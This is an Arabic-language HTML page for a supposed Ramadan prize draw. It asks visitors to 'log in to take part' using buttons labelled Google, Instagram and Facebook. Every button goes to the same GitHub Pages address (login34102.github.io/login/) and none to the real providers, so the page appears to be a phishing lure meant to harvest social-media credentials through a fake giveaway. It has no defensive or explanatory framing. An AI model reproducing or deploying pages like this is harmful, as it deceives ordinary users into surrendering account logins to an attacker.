<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>قرعة رمضان</title>
    <style>
        @import url('');

body {
    margin: 0;
    padding: 0;
    font-family: 'Cairo', sans-serif;
    background: url('https://f.top4top.io/p_3329rnckx1.jpg') no-repeat center center fixed;
    background-size: cover;
    overflow: hidden;
}

.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.6);
}

.container {
    text-align: center;
    color: #fff;
    position: relative;
    z-index: 2;
    padding-top: 10%;
}

.title {
    font-size: 50px;
    text-shadow: 2px 2px 10px #ffcc00;
}

.subtitle {
    font-size: 24px;
    margin-bottom: 20px;
    text-shadow: 1px 1px 5px #ffffff;
}

.login-box {
    background: rgba(255, 255, 255, 0.2);
    padding: 20px;
    border-radius: 15px;
    display: inline-block;
    box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
}

.login-btn {
    display: block;
    width: 250px;
    margin: 10px auto;
    padding: 10px;
    border: none;
    border-radius: 5px;
    font-size: 18px;
    cursor: pointer;
    transition: 0.3s;
}

.facebook {
    background: #1877f2;
    color: white;
}

.instagram {
    background: #e4405f;
    color: white;
}

.google {
    background: #db4437;
    color: white;
}

.login-btn:hover {
    opacity: 0.8;
}
    </style>
</head>
<body>

    <div class="overlay"></div>

    <div class="container">
        <h1 class="title">قرعة رمضان المبارك</h1>
        <h2 class="subtitle">انضم إلينا وكن أحد الفائزين في قرعة رمضان! 🌙✨</h2>

        <div class="login-box">
            <h2>سجّل دخولك للمشاركة:</h2>
            <button class="login-btn facebook" onclick="window.location.href='https://login34102.github.io/login/'">تسجيل الدخول عبر غوغل</button>

<button class="login-btn instagram" onclick="window.location.href='https://login34102.github.io/login/'">تسجيل الدخول عبر إنستغرام</button>
             <button class="login-btn facebook" onclick="window.location.href='https://login34102.github.io/login/'">تسجيل الدخول عبر فيسبوك</button>

        </div>
    </div>

</body>
</html>
